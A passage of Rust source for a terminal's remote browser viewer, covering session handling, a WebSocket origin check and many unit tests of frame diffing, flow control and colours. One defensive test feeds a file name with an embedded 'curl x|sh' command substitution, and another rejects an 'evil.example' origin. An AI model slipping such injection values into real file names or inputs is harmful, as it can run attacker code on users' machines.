                    follow_new = None;
                    // A pane that is already gone gets the same answer as one
                    // that closes while viewed, and no entry in `dirty`.
                    if lookup_pane(pane_id).is_none() {
                        let Some(json) = encode(&WebServerMsg::Closed { pane_id }) else { continue };
                        if outbox.send(json).await.is_err() {
                            break;
                        }
                        continue;
                    }
                    if focus {
                        dispatch_tab_action(TabAction::Activate { pane_id });
                    }
                    attached = Some(pane_id);
                    view.claimed = None;
                    updates = Some(subscribe(&dirty, pane_id));
                    view.pinned_top = None;
                    view.seen_at = None;
                    mark_seen(pane_id, &mut view);
                    shown = Shown::default();
                    dirty_frame = true;
                    continue;
                }
                if matches!(msg, WebClientMsg::NewTab) {
                    let seen = last_tabs.iter().flatten().map(|t| t.tab_id).collect();
                    follow_new = Some((seen, std::time::Instant::now() + Duration::from_secs(5)));
                }
                let Some(pane) = attached.and_then(lookup_pane) else { continue };
                handle_input(&pane, msg, &mut view);
                dirty_frame = true;
            }
            update = pane_update => match update {
                Ok(()) | Err(broadcast::error::RecvError::Lagged(_)) => dirty_frame = true,
                Err(broadcast::error::RecvError::Closed) => updates = None,
            },
            posted = notifications.recv() => {
                if let Ok(n) = posted {
                    let msg = WebServerMsg::Notify { pane_id: n.pane_id, title: &n.title, body: &n.body };
                    let Some(json) = encode(&msg) else { continue };
                    if outbox.send(json).await.is_err() {
                        break;
                    }
                }
            }
            done = previews_done.recv() => {
                let Some((id, made)) = done else { continue };
                if !previewing.remove(&id) {
                    continue;
                }
                let replies = match made {
                    Ok(bytes) => start_preview(id, bytes, &mut downloads.0),
                    Err(detail) => encode(&WebServerMsg::FileError { id, detail: &detail })
                        .into_iter()
                        .collect(),
                };
                for json in replies {
                    if outbox.send_bulk(json).await.is_err() {
                        break;
                    }
                }
            }
            copied = clipboard.recv() => {
                if let Ok((pane_id, text)) = copied {
                    if attached == Some(pane_id) {
                        let Some(json) = encode(&WebServerMsg::Clipboard { text: &text }) else { continue };
                        if outbox.send(json).await.is_err() {
                            break;
                        }
                    }
                }
            }
            _ = idle.tick() => {
                if frame_window.enabled && frame_window.sent > frame_window.acked && last_frame_at.elapsed() > Duration::from_secs(90) { break; }
                if last_heard.elapsed() > SESSION_SILENCE {
                    log::info!("kaku-remote web: no word from the browser for {}s, ending its session", SESSION_SILENCE.as_secs());
                    break;
                }
                dirty_frame = attached.is_some();
                tabs_due = Some(tokio::time::Instant::now());
            }
            changed = tab_changes.recv() => {
                let wait = match changed {
                    Ok(false) => TITLE_REFRESH,
                    Ok(true) | Err(broadcast::error::RecvError::Lagged(_)) => Duration::ZERO,
                    Err(broadcast::error::RecvError::Closed) => IDLE_REFRESH,
                };
                let due = tokio::time::Instant::now() + wait;
                tabs_due = Some(tabs_due.map_or(due, |d| d.min(due)));
            }
            _ = tokio::time::sleep_until(tabs_due.unwrap_or_else(tokio::time::Instant::now)), if tabs_due.is_some() && !tabs_pending => {
                tabs_due = None;
                tabs_pending = true;
                request_tabs(tabs_ready.clone());
            }
            Some(tabs) = tabs_results.recv() => {
                tabs_pending = false;
                if last_tabs.as_ref() != Some(&tabs) {
                    if let Some(json) = encode(&WebServerMsg::Tabs { tabs: &tabs }) {
                        if outbox.send(json).await.is_err() { break; }
                        last_tabs = Some(tabs);
                    }
                }
                // The tab this browser opened: view it now and send its first
                // frame right behind the list, rather than a round trip later
                // when the page asks for it.
                if let Some((seen, until)) = &follow_new {
                    let fresh = last_tabs.iter().flatten().find(|t| !seen.contains(&t.tab_id) && lookup_pane(t.pane_id).is_some()).map(|t| t.pane_id);
                    if let Some(pane_id) = fresh {
                        follow_new = None;
                        attached = Some(pane_id);
                        view.claimed = None;
                        updates = Some(subscribe(&dirty, pane_id));
                        view.pinned_top = None;
                        view.seen_at = None;
                        mark_seen(pane_id, &mut view);
                        shown = Shown::default();
                        dirty_frame = true;
                        next_render = tokio::time::Instant::now();
                    } else if std::time::Instant::now() > *until {
                        follow_new = None;
                    }
                }
            }
            _ = tokio::time::sleep_until(next_render), if dirty_frame && frame_window.ready() => {
                dirty_frame = false;
                let Some(pane_id) = attached else { continue };
                let Some(pane) = lookup_pane(pane_id) else {
                    attached = None;
                    updates = None;
                    let msg = WebServerMsg::Closed { pane_id };
                    let Some(json) = encode(&msg) else { continue };
                    if outbox.send(json).await.is_err() {
                        break;
                    }
                    continue;
                };
                // Only rows that changed since the last frame are sent; idle
                // refreshes usually change nothing and send nothing.
                let Some((frame, data)) = shown.update(render_frame(&pane, &mut view)) else {
                    continue;
                };
                let images_changed = frame.images_changed;
                let mut placed = Vec::new();
                let mut frame_bytes = 0;
                if images_changed {
                    for placement in &frame.images {
                        if !sent_images.contains(&placement.id) {
                            let Some(image) = frame.image_data.get(&placement.id) else { continue };
                            let Some((mime, bytes)) = image_file(image) else { continue };
                            let encoded = base64::engine::general_purpose::STANDARD.encode(bytes);
                            let msg = WebServerMsg::Image { id: &placement.id, mime, data: &encoded };
                            let Some(json) = encode(&msg) else { continue };
                            frame_bytes += json.len();
                            if outbox.send(json).await.is_err() {
                                return;
                            }
                            sent_images.insert(placement.id.clone());
                        }
                        placed.push(placement.clone());
                    }
                }
                let layout = !page_delta || frame.layout_changed;
                let msg = WebServerMsg::Frame {
                    seq: frame_window.sent + 1,
                    pane_id: layout.then_some(pane_id),
                    cols: layout.then_some(frame.cols),
                    rows: layout.then_some(frame.rows),
                    title: (!page_delta || frame.title_changed).then_some(frame.title.as_str()),
                    scrolled: layout.then_some(frame.scrolled),
                    local_scroll: layout.then_some(frame.local_scroll),
                    data: &data,
                    wrapped: (!page_delta || frame.wrapped_changed).then_some(frame.wrapped.as_slice()),
                    images: images_changed.then_some(placed.as_slice()),
                };
                let Some(json) = encode(&msg) else { continue };
                frame_bytes += json.len();
                if outbox.send(json).await.is_err() {
                    break;
                }
                frame_window.record(frame_bytes);
                shown.sent_as(frame_window.sent);
                last_frame_at = std::time::Instant::now();
                // Only a frame sent starts the interval: input marks the view
                // dirty before its echo arrives, and that render, which finds
                // nothing new, must not hold the echo back for a tick.
                next_render = tokio::time::Instant::now()
                    + if page_hidden { HIDDEN_FRAME_INTERVAL } else { FRAME_INTERVAL };
            }
        }
    }
}

// ── Local WebSocket ───────────────────────────────────────────────────────────

pub(crate) async fn route_ws(
    Query(query): Query<WsQuery>,
    State(dirty): State<WebDirty>,
    headers: axum::http::HeaderMap,
    upgrade: ws::WebSocketUpgrade,
) -> Response {
    if !same_origin(&headers) {
        return (StatusCode::FORBIDDEN, "unexpected origin").into_response();
    }
    if !check_token(&query, &headers) {
        return (StatusCode::UNAUTHORIZED, "invalid token").into_response();
    }
    upgrade.on_upgrade(move |socket| handle_local_ws(socket, dirty))
}

/// Browsers do not apply the same-origin policy to WebSockets, and a page
/// on any site that opens `ws://127.0.0.1:<port>` sends this listener's own
/// Host. So a browser's upgrade must come from the page this listener
/// served (its Origin is the Host the middleware already checked), leaving
/// the token as the second lock, not the only one. A request without an
/// Origin is not from a web page.
fn same_origin(headers: &axum::http::HeaderMap) -> bool {
    let Some(origin) = headers.get(axum::http::header::ORIGIN) else {
        return true;
    };
    let host = headers
        .get(axum::http::header::HOST)
        .and_then(|v| v.to_str().ok())
        .unwrap_or("");
    origin
        .to_str()
        .ok()
        .and_then(|o| o.strip_prefix("http://"))
        .is_some_and(|o| !host.is_empty() && o.eq_ignore_ascii_case(host))
}

async fn handle_local_ws(socket: ws::WebSocket, dirty: WebDirty) {
    let (mut ws_tx, mut ws_rx) = socket.split();
    let (in_tx, in_rx) = mpsc::channel::<String>(64);
    let (out_tx, replies) = crate::queue::channel::<String>(64);
    let (frames_tx, mut frames_rx) = mpsc::channel::<Vec<u8>>(4);
    let session = tokio::spawn(run_session(in_rx, out_tx, frames_tx, dirty));
    let (output, mut outgoing) = crate::queue::channel_with_capacity(64, 1);
    let mut forwarders = Vec::new();
    for (mut source, destination) in [
        (replies.interactive, output.interactive.clone()),
        (replies.bulk, output.bulk.clone()),
    ] {
        forwarders.push(tokio::spawn(async move {
            while let Some(text) = source.recv().await {
                if destination
                    .send(ws::Message::Text(text.into()))
                    .await
                    .is_err()
                {
                    break;
                }
            }
        }));
    }
    forwarders.push(tokio::spawn(async move {
        while let Some(frame) = frames_rx.recv().await {
            if output
                .send_bulk(ws::Message::Binary(frame.into()))
                .await
                .is_err()
            {
                break;
            }
        }
    }));
    let writer = tokio::spawn(async move {
        while let Some(msg) = outgoing.recv().await {
            if ws_tx.send(msg).await.is_err() {
                break;
            }
        }
    });
    forward_until_session_ends(&mut ws_rx, in_tx, session).await;
    writer.abort();
    for forwarder in forwarders {
        forwarder.abort();
    }
}

/// Passes the browser's text messages to its session until either side is
/// done. The session ends on its own after `SESSION_SILENCE`; a half-open
/// socket (a laptop that went to sleep) never delivers another message, so
/// waiting on the socket alone kept the task and its descriptor until TCP
/// gave up.
async fn forward_until_session_ends<S, E>(
    incoming: &mut S,
    in_tx: mpsc::Sender<String>,
    mut session: tokio::task::JoinHandle<()>,
) where
    S: futures_util::Stream<Item = Result<ws::Message, E>> + Unpin,
{
    loop {
        tokio::select! {
            _ = &mut session => return,
            msg = incoming.next() => match msg {
                Some(Ok(ws::Message::Text(text))) => {
                    if in_tx.send(text.to_string()).await.is_err() {
                        break;
                    }
                }
                Some(Ok(ws::Message::Close(_))) | Some(Err(_)) | None => break,
                Some(Ok(_)) => {}
            },
        }
    }
    drop(in_tx);
    let _ = session.await;
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn an_uploaded_name_cannot_run_a_command_at_the_prompt() {
        let path = "/Users/me/Downloads/Kaku/a$(curl x|sh);b.png";
        let quoted = quote_uploaded(path, config::DroppedFileQuoting::SpacesOnly);
        assert_eq!(shlex::split(&quoted).unwrap(), vec![path.to_string()]);
        assert!(quoted.starts_with('\''));
        // An explicit choice of no quoting is still the person's.
        assert_eq!(quote_uploaded(path, config::DroppedFileQuoting::None), path);
        // Names that reorder or hide text are cleaned before saving.
        assert_eq!(safe_file_name("invoice\u{202E}gpj.app"), "invoicegpj.app");
    }

    #[test]
    fn only_the_local_page_itself_opens_the_socket() {
        let headers = |origin: Option<&str>| {
            let mut h = axum::http::HeaderMap::new();
            h.insert(axum::http::header::HOST, "127.0.0.1:9988".parse().unwrap());
            if let Some(o) = origin {
                h.insert(axum::http::header::ORIGIN, o.parse().unwrap());
            }
            h
        };
        assert!(same_origin(&headers(Some("http://127.0.0.1:9988"))));
        // Not a web page (the CLI, a test client).
        assert!(same_origin(&headers(None)));
        // Any other site the person has open, with a leaked token.
        assert!(!same_origin(&headers(Some("https://evil.example"))));
        assert!(!same_origin(&headers(Some("http://127.0.0.1:8000"))));
        assert!(!same_origin(&headers(Some("http://localhost:9988"))));
        assert!(!same_origin(&headers(Some("null"))));
    }
    use termwiz::color::SrgbaTuple;

    /// A 2x2 image placed at column 3 is found from any of its cells, and
    /// one scrolled half off the top starts above the first row. Its raw
    /// pixels reach the browser as a PNG.
    #[test]
    fn inline_images_are_placed_in_cells_and_sent_as_files() {
        use wezterm_term::image::{ImageCell, TextureCoordinate};
        let data = Arc::new(ImageData::with_data(ImageDataType::new_single_frame(
            2,
            2,
            vec![255; 16],
        )));
        let line_with = |tl: (f32, f32), br: (f32, f32)| {
            let mut line = Line::with_width(8, 0);
            let mut attrs = CellAttributes::default();
            attrs.attach_image(ImageCell::new(
                TextureCoordinate::new_f32(tl.0, tl.1),
                TextureCoordinate::new_f32(br.0, br.1),
                data.clone(),
            ));
            line.set_cell(3, termwiz::cell::Cell::new(' ', attrs), 0);
            line
        };
        let (whole, files) = image_placements(&[line_with((0.0, 0.0), (0.5, 0.5))]);
        assert_eq!(whole.len(), 1);
        assert_eq!(
            (whole[0].col, whole[0].row, whole[0].cols, whole[0].rows),
            (3.0, 0.0, 2.0, 2.0)
        );
        let (scrolled, _) = image_placements(&[line_with((0.0, 0.5), (0.5, 1.0))]);
        assert_eq!((scrolled[0].col, scrolled[0].row), (3.0, -1.0));
        let (mime, png) = image_file(&files[&whole[0].id]).unwrap();
        assert_eq!(mime, "image/png");
        assert!(png.starts_with(b"\x89PNG"));
    }

    /// Notification text is capped by characters, never mid-character.
    #[test]
    fn notification_text_is_clipped_on_character_boundaries() {
        assert_eq!(&*clip("Done", 120), "Done");
        assert_eq!(&*clip("构建完成了", 2), "构建");
        assert_eq!(clip(&"a".repeat(600), 500).len(), 500);
    }

    /// A browser that went silent behind a half-open socket: the session gives
    /// up, and the socket must be let go with it instead of waiting forever.
    #[tokio::test]
    async fn a_finished_session_releases_a_silent_socket() {
        let mut silent = futures_util::stream::pending::<Result<ws::Message, ()>>();
        let (in_tx, _in_rx) = mpsc::channel::<String>(1);
        let session = tokio::spawn(async {});
        let done = tokio::time::timeout(
            Duration::from_secs(2),
            forward_until_session_ends(&mut silent, in_tx, session),
        )
        .await;
        assert!(done.is_ok());
    }

    #[test]
    fn sgr_encodes_palette_truecolor_and_flags() {
        let mut attrs = CellAttributes::default();
        attrs.set_foreground(ColorAttribute::PaletteIndex(2));
        attrs.set_background(ColorAttribute::TrueColorWithDefaultFallback(SrgbaTuple(
            1.0, 0.0, 0.5, 1.0,
        )));
        attrs.set_intensity(Intensity::Bold);
        attrs.set_reverse(true);
        let mut out = String::new();
        Sgr::from_attrs(&attrs, &ColorPalette::default()).write(&mut out);
        assert_eq!(out, "\x1b[0;1;7;38;5;2;48;2;255;0;127m");
    }

    /// Dim text as the Mac window draws it: the foreground darkened a quarter
    /// in linear light, sent as a color, never as xterm's half-opacity dim,
    /// which after a reverse swap turned Claude Code's chips grey on blue.
    #[test]
    fn dim_text_is_sent_as_the_macs_darkened_color() {
        let mut attrs = CellAttributes::default();
        attrs.set_foreground(ColorAttribute::TrueColorWithDefaultFallback(SrgbaTuple(
            1.0, 1.0, 1.0, 1.0,
        )));
        attrs.set_intensity(Intensity::Half);
        attrs.set_reverse(true);
        let mut out = String::new();
        Sgr::from_attrs(&attrs, &ColorPalette::default()).write(&mut out);
        // White at 0.75 linear is 224 in sRGB; no SGR 2, reverse kept.
        assert_eq!(out, "\x1b[0;7;38;2;224;224;224m");
        // The default foreground resolves through the pane's palette first.
        let mut plain = CellAttributes::default();
        plain.set_intensity(Intensity::Half);
        let mut out = String::new();
        Sgr::from_attrs(&plain, &ColorPalette::default()).write(&mut out);
        assert!(out.starts_with("\x1b[0;38;2;"), "{out}");
    }

    /// Backgrounds and foregrounds the Mac window remaps through the scheme's
    /// overrides go to the page as the remapped color; the rest keep their
    /// index so the page's own palette still draws them.
    #[test]
    fn colors_the_mac_overrides_are_sent_overridden() {
        let mut palette = ColorPalette::default();
        let light_black = SrgbaTuple(0.78, 0.78, 0.8, 1.0);
        let window_bg = SrgbaTuple(0.08, 0.08, 0.1, 1.0);
        palette.colors.0[0] = light_black;
        palette.color_overrides.insert(light_black, window_bg);
        let black_text = SrgbaTuple(0.0, 0.0, 0.0, 1.0);
        let readable = SrgbaTuple(0.8, 0.8, 0.8, 1.0);
        palette
            .foreground_color_overrides
            .insert(black_text, readable);

        // Claude Code's scrolled transcript: default text on ANSI black.
        let mut attrs = CellAttributes::default();
        attrs.set_background(ColorAttribute::PaletteIndex(0));
        let mut out = String::new();
        Sgr::from_attrs(&attrs, &palette).write(&mut out);
        assert_eq!(out, "\x1b[0;48;2;20;20;25m");

        // ANSI black text keeps its index: overrides only remap backgrounds.
        let mut attrs = CellAttributes::default();
        attrs.set_foreground(ColorAttribute::PaletteIndex(0));
        attrs.set_background(ColorAttribute::PaletteIndex(4));
        let mut out = String::new();
        Sgr::from_attrs(&attrs, &palette).write(&mut out);
        assert_eq!(out, "\x1b[0;38;5;0;48;5;4m");

        let mut attrs = CellAttributes::default();
        attrs.set_foreground(ColorAttribute::TrueColorWithDefaultFallback(black_text));
        let mut out = String::new();
        Sgr::from_attrs(&attrs, &palette).write(&mut out);
        assert_eq!(out, "\x1b[0;38;2;204;204;204m");
    }

    #[test]
    fn web_sized_tabs_keep_their_size_until_the_mac_window_is_dragged() {
        let tab = usize::MAX - 7;
        assert!(window_relayout_resizes_tab(tab, false));
        WEB_SIZED_TABS.lock().insert(tab);
        assert!(!window_relayout_resizes_tab(tab, false));
        assert!(tab_is_web_sized(tab));
        assert!(window_relayout_resizes_tab(tab, true));
        assert!(!tab_is_web_sized(tab));
    }

    #[test]
    fn a_split_tab_keeps_the_macs_size() {
        assert_eq!(split_claim(1, false), SplitClaim::Size);
        assert_eq!(split_claim(1, true), SplitClaim::Size, "a zoomed pane");
        assert_eq!(split_claim(2, false), SplitClaim::Ignore);
        assert_eq!(
            split_claim(4, true),
            SplitClaim::GiveBack,
            "split after a browser had sized it"
        );
        let source = include_str!("web.rs");
        let claim = source
            .split("pub fn claim_tab_size_on_gui_thread(")
            .nth(1)
            .unwrap()
            .split("struct Frame {")
            .next()
            .unwrap();
        assert!(claim.contains("split_claim(tab.iter_panes().len()"));
        assert!(
            claim.find("SplitClaim::Ignore => return").unwrap()
                < claim.find("WEB_SIZED_TABS.lock().insert").unwrap(),
            "a split tab is never marked as sized by the browser"
        );
    }

    #[test]
    fn closed_names_the_pane_it_reports() {
        // The page ignores a closed notice for a pane it already left; without
        // the id it dropped the tab it had just switched to.
        let json = encode(&WebServerMsg::Closed { pane_id: 7 }).unwrap();
        assert_eq!(json, r#"{"type":"closed","pane_id":7}"#);
    }

    #[test]
    fn default_attrs_reset_only() {
        let mut out = String::new();
        Sgr::from_attrs(&CellAttributes::default(), &ColorPalette::default()).write(&mut out);
        assert_eq!(out, "\x1b[0m");
    }

    #[test]
    fn published_tab_titles_are_trimmed() {
        publish_tab_title(usize::MAX, "  Users/tw93  ");
        assert_eq!(
            TAB_TITLES.lock().get(&usize::MAX).map(String::as_str),
            Some("Users/tw93")
        );
    }

    #[test]
    fn agent_titles_and_chat_panes_follow_the_gui() {
        let tab = usize::MAX - 1;
        publish_agent_title(tab, Some(("claude", "  Fix the padding bug ")));
        let shown = AGENT_TITLES.lock().get(&tab).cloned();
        assert_eq!(
            shown,
            Some(AgentInfo {
                program: "claude",
                topic: "Fix the padding bug".into()
            })
        );
        publish_agent_title(tab, None);
        assert!(!AGENT_TITLES.lock().contains_key(&tab));

        let pane = usize::MAX - 1;
        set_ai_chat_open(pane, true);
        assert!(ai_chat_open(pane), "input to a pane under the chat is held");
        set_ai_chat_open(pane, false);
        assert!(!ai_chat_open(pane));
    }

    fn frame(cols: usize, lines: &[&str], cursor: &str) -> Frame {
        Frame {
            cols,
            rows: lines.len(),
            title: "t".into(),
            scrolled: false,
            local_scroll: true,
            lines: lines.iter().map(|l| l.to_string()).collect(),
            wrapped: vec![false; lines.len()],
            cursor: cursor.into(),
            images: Vec::new(),
            image_data: HashMap::new(),
            images_changed: false,
            cells: Vec::new(),
            title_changed: false,
            wrapped_changed: false,
            layout_changed: false,
        }
    }

    #[test]
    fn frames_send_only_changed_rows() {
        let mut shown = Shown::default();
        let (_, first) = shown.update(frame(10, &["A", "B", "C"], "@1")).unwrap();
        assert_eq!(first, "\x1b[?25lABC@1", "first frame is complete");

        let (_, second) = shown.update(frame(10, &["A", "X", "C"], "@1")).unwrap();
        assert_eq!(second, "\x1b[?25lX@1", "only the changed row");

        assert!(
            shown.update(frame(10, &["A", "X", "C"], "@1")).is_none(),
            "nothing changed, nothing sent"
        );

        let (_, cursor_only) = shown.update(frame(10, &["A", "X", "C"], "@2")).unwrap();
        assert_eq!(cursor_only, "\x1b[?25l@2");

        let (_, resized) = shown.update(frame(12, &["A", "X", "C"], "@2")).unwrap();
        assert_eq!(resized, "\x1b[?25lAXC@2", "a resize redraws everything");
    }

    #[test]
    fn frame_window_allows_sixteen_small_frames_and_rejects_future_acks() {
        let mut window = FrameWindow::default();
        window.hello(true);
        for _ in 0..16 {
            assert!(window.ready());
            window.record(100);
        }
        assert!(!window.ready());
        window.acknowledge(17);
        assert!(!window.ready(), "a future ACK cannot release backpressure");
        window.acknowledge(5);
        assert!(window.ready());
        assert_eq!(window.pending.len(), 11);
        window.acknowledge(5);
        window.acknowledge(3);
        assert_eq!(
            window.pending.len(),
            11,
            "duplicate and older ACKs do nothing"
        );
        window.acknowledge(16);
        assert!(window.pending.is_empty());
    }

    #[test]
    fn frame_window_keeps_60hz_flowing_over_180ms_with_acks_every_four_frames() {
        // The page acks every fourth frame on arrival, so up to RTT/16 + 4
        // frames are in flight; twelve stalled the stream past 128 ms.
        let rtt = 180;
        let mut window = FrameWindow::default();
        window.hello(true);
        let mut acks = VecDeque::new();
        for now in (0..3000).step_by(16) {
            while acks.front().is_some_and(|&(at, _)| at <= now) {
                window.acknowledge(acks.pop_front().unwrap().1);
            }
            assert!(
                window.ready(),
                "frame {} waited for an ack at {now} ms",
                window.sent + 1
            );
            window.record(100);
            if window.sent % 4 == 0 {
                acks.push_back((now + rtt, window.sent));
            }
        }
    }

    #[test]
    fn frame_window_byte_watermark_pauses_until_ack_and_allows_one_large_frame() {
        let mut window = FrameWindow::default();
        window.hello(true);
        window.record(FRAME_BYTES_WATERMARK - 1);
        assert!(window.ready());
        window.record(1);
        assert!(
            !window.ready(),
            "byte backpressure precedes the frame count limit"
        );
        window.acknowledge(1);
        assert!(window.ready());
        window.record(FRAME_BYTES_WATERMARK * 2);
        assert!(
            !window.ready(),
            "a complete frame may cross the watermark once"
        );
        window.acknowledge(2);
        assert!(!window.ready(), "the large frame still needs its own ACK");
        window.acknowledge(3);
        assert!(
            window.ready(),
            "large frames cannot permanently stall the window"
        );
    }

    #[test]
    fn frame_window_hello_clears_accounting_without_reusing_sequences() {
        let mut window = FrameWindow::default();
        window.hello(true);
        window.record(FRAME_BYTES_WATERMARK);
        window.hello(true);
        assert!(window.ready());
        assert!(window.pending.is_empty());
        assert_eq!(window.acked, window.sent);
        window.record(20);
        assert_eq!(window.sent, 2);
        window.hello(false);
        assert!(window.pending.is_empty());
        for _ in 0..20 {
            assert!(window.ready());
            window.record(20);
        }
        assert!(
            window.pending.is_empty(),
            "legacy clients retain no byte ledger"
        );
        window.hello(true);
        assert!(window.ready());
        assert_eq!(window.acked, 22);
        window.record(20);
        window.acknowledge(2);
        assert_eq!(
            window.pending.len(),
            1,
            "an old ACK cannot release new frames"
        );
    }

    #[test]
    fn wrap_only_changes_reach_the_browser() {
        let mut shown = Shown::default();
        shown.update(frame(10, &["ABCDEFGHIJ", "K"], "@1"));
        let mut wrapped = frame(10, &["ABCDEFGHIJ", "K"], "@1");
        wrapped.wrapped[0] = true;
        let (sent, _) = shown
            .update(wrapped)
            .expect("soft wrap changed with identical row text");
        assert_eq!(sent.wrapped, [true, false]);
        let (sent, _) = shown
            .update(frame(10, &["ABCDEFGHIJ", "K"], "@1"))
            .expect("hard newline restored");
        assert_eq!(sent.wrapped, [false, false]);
    }

    /// Rows as render_frame writes them: each carries its own position.
    fn rows(texts: &[&str]) -> Vec<String> {
        texts
            .iter()
            .enumerate()
            .map(|(i, t)| format!("\x1b[{};1H{t}", i + 1))
            .collect()
    }

    /// Applies what Shown sends to a model of the browser screen: row
    /// positions, scroll up (S) and scroll down (T) with blank rows coming in.
    fn apply(screen: &mut [String], data: &str) {
        let mut rest = data;
        while let Some(at) = rest.find("\x1b[") {
            rest = &rest[at + 2..];
            let end = rest.find(|c: char| c.is_ascii_alphabetic()).unwrap();
            let (params, cmd) = (&rest[..end], &rest[end..=end]);
            rest = &rest[end + 1..];
            let n: usize = params.split(';').next().unwrap().parse().unwrap_or(1);
            match cmd {
                "S" => {
                    screen.rotate_left(n);
                    let len = screen.len();
                    screen[len - n..].iter_mut().for_each(String::clear);
                }
                "T" => {
                    screen.rotate_right(n);
                    screen[..n].iter_mut().for_each(String::clear);
                }
                "H" if params.ends_with(";1") => {
                    let text = rest.split("\x1b[").next().unwrap();
                    screen[n - 1] = text.to_string();
                }
                _ => {}
            }
        }
    }

    #[test]
    fn moved_rows_are_scrolled_not_resent() {
        let texts = ["l1", "l2", "l3", "l4", "l5", "l6", "l7", "l8"];
        let mut shown = Shown::default();
        let mut screen = vec![String::new(); 8];
        let (_, first) = shown
            .update(Frame {
                lines: rows(&texts),
                ..frame(10, &[], "")
            })
            .unwrap();
        apply(&mut screen, &first);

        // Two new lines of output push everything up.
        let up = ["l3", "l4", "l5", "l6", "l7", "l8", "n1", "n2"];
        let (_, data) = shown
            .update(Frame {
                lines: rows(&up),
                ..frame(10, &[], "")
            })
            .unwrap();
        assert!(data.contains("\x1b[2S"), "scrolls up by two: {data:?}");
        assert_eq!(data.matches(";1H").count(), 2, "sends only the new rows");
        apply(&mut screen, &data);
        assert_eq!(screen, up);

        // Scrolling back into history moves it down again, with a row edited.
        let down = ["l1", "l2", "l3", "l4", "X5", "l6", "l7", "l8"];
        let (_, data) = shown
            .update(Frame {
                lines: rows(&down),
                ..frame(10, &[], "")
            })
            .unwrap();
        assert!(data.contains("\x1b[2T"), "scrolls down by two: {data:?}");
        assert_eq!(data.matches(";1H").count(), 3);
        apply(&mut screen, &data);
        assert_eq!(screen, down);
    }

    #[test]
    fn unrelated_screens_are_not_treated_as_moved() {
        let mut shown = Shown::default();
        shown.update(Frame {
            lines: rows(&["a", "b", "c", "d", "e", "f"]),
            ..frame(10, &[], "")
        });
        let (_, data) = shown
            .update(Frame {
                lines: rows(&["u", "v", "w", "x", "y", "z"]),
                ..frame(10, &[], "")
            })
            .unwrap();
        assert!(!data.contains('S') && !data.contains('T'), "{data:?}");
    }

    #[test]
    fn a_check_compares_with_the_frame_the_page_drew() {
        let mut shown = Shown::default();
        shown
            .update(frame(10, &["\x1b[1;1H\x1b[31mA", "\x1b[2;1HB"], "@1"))
            .unwrap();
        shown.sent_as(1);
        shown
            .update(frame(10, &["\x1b[1;1H\x1b[31mA", "\x1b[2;1HC"], "@1"))
            .unwrap();
        shown.sent_as(2);
        assert_eq!(shown.rows_after(1).map(<[String]>::len), Some(2));
        assert_ne!(shown.rows_after(1), shown.rows_after(2));
        assert!(shown.rows_after(2).unwrap()[1].ends_with('C'));
        // Only the text is kept, and a check on it still finds drift.
        assert!(!shown.rows_after(2).unwrap().concat().contains('\x1b'));
        let page = vec!["A".to_string(), "B".to_string()];
        assert!(drifted_rows(shown.rows_after(1).unwrap(), &page).is_empty());
        assert_eq!(drifted_rows(shown.rows_after(2).unwrap(), &page), vec![1]);
        for seq in 3..=(2 + SENT_KEPT as u64) {
            shown.sent_as(seq);
        }
        assert_eq!(shown.rows_after(1), None);
        assert!(Shown::default().rows_after(2).is_none());
    }

    #[test]
    fn drift_report_names_a_page_shifted_by_whole_rows() {
        let shown = rows(&["a", "b", "c", "d", "prompt"]);
        // The page shows Kaku's rows one further down, as a stale extra row
        // scrolled up by a move would leave it.
        let page: Vec<String> = ["b", "c", "d", "prompt", "prompt"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        let drift = drifted_rows(&shown, &page);
        assert_eq!(drift, vec![0, 1, 2, 3]);
        assert_eq!(page_offset(&shown, &page, &drift), Some(1));
        let garbled: Vec<String> = ["a", "x", "c", "y", "prompt"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        let drift = drifted_rows(&shown, &garbled);
        assert_eq!(page_offset(&shown, &garbled, &drift), None);
        let blank = vec![String::new(); 5];
        let drift = drifted_rows(&shown, &blank);
        assert_eq!(page_offset(&shown, &blank, &drift), None);
    }

    #[test]
    fn drift_report_names_rows_the_page_repeats_without_their_text() {
        let shown = rows(&["a", "b", "c", "d", "prompt"]);
        // The screen filled with one row, as reported after scrolling.
        let page: Vec<String> = ["d", "d", "d", "", "nope"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        let drift = drifted_rows(&shown, &page);
        assert_eq!(page_sources(&shown, &page, &drift), "0>3 1>3 2>3 3>_ 4>?");
        assert_eq!(repeated_rows(&page), 2);
        assert_eq!(repeated_rows(&rows(&["a", "b"])), 0);

        // The page's trace rides along, cut on a character boundary.
        let traced: PageView = serde_json::from_str(
            r#"{"cols":10,"trace":"cursor 0,4 region 0-4; writes 3:\\e[5;1Ha2"}"#,
        )
        .unwrap();
        assert_eq!(traced.trace(), "cursor 0,4 region 0-4; writes 3:\\e[5;1Ha2");
        let long = PageView {
            trace: "é".repeat(TRACE_LOGGED),
            ..Default::default()
        };
        assert!(long.trace().len() <= TRACE_LOGGED && long.trace().ends_with('é'));
        assert_eq!(PageView::default().trace(), "");

        let mut shown = Shown::default();
        let texts = ["l1", "l2", "l3", "l4", "l5", "l6", "l7", "l8"];
        let up = ["l3", "l4", "l5", "l6", "l7", "l8", "n1", "n2"];
        shown.update(Frame {
            lines: rows(&texts),
            ..frame(10, &[], "")
        });
        shown.update(Frame {
            lines: rows(&up),
            ..frame(10, &[], "")
        });
        assert_eq!(Vec::from(shown.recent.clone()), ["full 8", "move 2 rows 2"]);
        let drawing = PageView {
            font: 14.0,
            cell_w: 8.4,
            cell_h: 18.0,
            icon: 14.0,
            dpr: 2.0,
            gl: true,
            atlas: 3,
            ..Default::default()
        };
        assert_eq!(
            drawing.drawing(),
            "font 14.00px cell 8.40x18.00 icon 14.00 dpr 2 webgl atlas resets 3 history closed"
        );
        assert_eq!(PageView::default().drawing(), "");
    }

    #[test]
    fn drift_compares_text_not_spacing() {
        let shown = rows(&["\x1b[0;31m中文 abc", "same", "kaku row"]);
        let page = vec![
            "中文  abc".to_string(),
            " same ".to_string(),
            "stale row".to_string(),
        ];
        assert_eq!(drifted_rows(&shown, &page), vec![2]);
        assert_eq!(
            row_text("\x1b[3;1H\x1b[0m⏺ hi\x1b[5G!\x1b[0m\x1b[K"),
            "⏺hi!"
        );
    }

    fn rt(row: isize, text: &str) -> RowText {
        let mut cols = Vec::new();
        let mut ends = Vec::new();
        let mut col = 0;
        for ch in text.chars() {
            cols.push(col);
            col += if ch.is_ascii() { 1 } else { 2 };
            ends.push(col);
        }
